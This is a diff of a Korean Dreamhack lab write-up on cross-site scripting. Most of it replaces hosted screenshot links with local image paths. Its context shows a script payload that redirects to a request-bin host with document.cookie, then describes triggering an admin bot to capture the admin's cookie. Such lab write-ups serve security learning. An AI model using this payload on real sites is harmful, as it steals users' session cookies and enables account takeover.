@@ -505,9 +505,10 @@ Accept-Encoding: gzip, deflate
 
 ## 문제 풀이 2: dreamhack **Request Bin**
 
-![dreamhack tools](https://tools.dreamhack.games/main)
+[dreamhack tools](https://tools.dreamhack.games/main)
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/268eec14-34c4-4051-8dc4-d38320318ca4/image.png)
+![4. Xross Site Scripting 4](/assets/images/writeup/web-hacking/knock-on/4_XSS_4.png)
+
 
 위 주소로 접속 후
 
@@ -521,37 +522,43 @@ Accept-Encoding: gzip, deflate
 <script>location.href="https://uplgtbm.request.dreamhack.games/"+document.cookie</script>
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/1a2f17c7-fca9-447e-a3b1-083285b95382/image.png)
+![4. Xross Site Scripting 5](/assets/images/writeup/web-hacking/knock-on/4_XSS_5.png)
+
 
 복사한 `URL`을 `location.href`에 할당 후 `document.cookie`로 해당 URL에 쿠키 전송 코드 작성
 
 |
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/d76d244c-6ef4-4d50-8f42-59a99d958687/image.png)
+![4. Xross Site Scripting 6](/assets/images/writeup/web-hacking/knock-on/4_XSS_6.png)
+
 
 잘 게시됨
 
 |
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/13182539-f592-4611-bff7-9d6ff861bfb0/image.png)
+![4. Xross Site Scripting 7](/assets/images/writeup/web-hacking/knock-on/4_XSS_7.png)
+
 
 게시글을 클릭하면 바로 해당 주소로 이동됨
 
 |
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/84ad5753-a5a9-4df8-a7fb-4cc93862eb3b/image.png)
+![4. Xross Site Scripting 8](/assets/images/writeup/web-hacking/knock-on/4_XSS_8.png)
+
 
 Request Bin에서 요청을 확인할 수 있음
 
 |
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/91161c19-ce0f-4314-9d55-5819b11047a3/image.png)
+![4. Xross Site Scripting 9](/assets/images/writeup/web-hacking/knock-on/4_XSS_9.png)
+
 
 게시글 id 입력 후 Active Admin Bot 버튼을 누르면
 
 |
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/29af0f24-72d3-477f-a439-cccb346de9ee/478bf8cb-8014-4a19-bcb4-b195a90edfb8/image.png)
+![4. Xross Site Scripting 10](/assets/images/writeup/web-hacking/knock-on/4_XSS_10.png)
+
 
 Request Bin에 cookie가 잘 전달됨
 
